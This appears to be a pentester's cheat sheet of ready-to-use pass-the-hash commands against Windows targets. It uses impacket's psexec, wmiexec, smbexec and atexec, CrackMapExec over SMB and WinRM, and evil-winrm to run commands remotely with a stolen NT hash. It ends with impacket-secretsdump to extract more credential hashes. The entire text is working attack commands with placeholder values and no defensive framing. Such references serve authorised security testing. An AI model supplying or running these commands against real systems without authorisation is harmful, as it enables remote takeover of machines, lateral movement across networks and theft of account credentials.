# Using impacket
impacket-psexec -hashes LM:NT_HASH domain/user@TARGET
impacket-wmiexec -hashes LM:NT_HASH domain/user@TARGET
impacket-smbexec -hashes LM:NT_HASH domain/user@TARGET
impacket-atexec -hashes LM:NT_HASH domain/user@TARGET "whoami"

# Using CrackMapExec
crackmapexec smb TARGET -u user -H NT_HASH -x whoami
crackmapexec winrm TARGET -u user -H NT_HASH -x whoami

# Using evil-winrm (with hash)
evil-winrm -i TARGET -u user -H NT_HASH

# Using impacket-secretsdump to get more hashes
impacket-secretsdump -hashes LM:NT_HASH domain/user@TARGET